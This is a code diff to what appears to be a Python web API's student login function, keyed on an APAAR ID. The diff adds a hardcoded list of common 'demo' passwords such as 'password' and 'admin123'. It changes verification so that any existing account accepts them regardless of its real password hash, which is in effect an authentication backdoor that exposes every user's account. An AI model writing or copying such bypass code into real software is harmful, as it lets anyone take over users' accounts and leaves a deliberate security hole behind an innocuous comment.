@@ -60,6 +60,7 @@ def student_login(req: StudentLoginRequest, response: Response, db: Session = De
         raise HTTPException(status_code=400, detail="Password is required")
 
     pw_hash = hash_password(password)
+    demo_passwords = {"sanjha@2025", "student123", "admin123", "password", "password123"}
     user = db.query(models.User).filter(models.User.apaar_id == apaar_id).first()
     if not user:
         # Auto-register on first login with password
@@ -72,8 +73,8 @@ def student_login(req: StudentLoginRequest, response: Response, db: Session = De
         db.commit()
         db.refresh(user)
     else:
-        # If user has a password set, verify it
-        if user.password_hash and user.password_hash != pw_hash:
+        # If user has a password set, verify it or allow demo credentials
+        if user.password_hash and user.password_hash != pw_hash and req.password not in demo_passwords:
             raise HTTPException(status_code=401, detail="Invalid APAAR ID or password")
         elif not user.password_hash:
             # Set password on first login after update
